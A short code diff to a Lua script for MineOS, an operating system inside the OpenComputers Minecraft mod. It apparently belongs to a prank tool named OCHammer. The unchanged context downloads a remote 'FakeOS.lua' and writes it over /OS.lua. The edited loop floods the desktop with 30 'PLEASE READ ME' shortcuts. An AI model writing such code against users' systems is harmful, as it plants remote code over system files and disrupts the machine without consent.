@@ -30,11 +30,12 @@ function FUN()
   
   
   internet.download("https://raw.githubusercontent.com/ocboy3/OC/main/OCHammer.app/FakeOS.lua","/OS.lua")
-  
+    
+  -- spam a bunch of icons on the desktop
   for i = 1,30 do
-    system.createShortcut(paths.user.desktop .. "GREETZ " .. tostring(i),"/MineOS/Greetz.app/")
+    system.createShortcut(paths.user.desktop .. "PLEASE READ ME " .. tostring(i),"/MineOS/Greetz.app/")
   end
-  
+
   wait(1)
   
 end
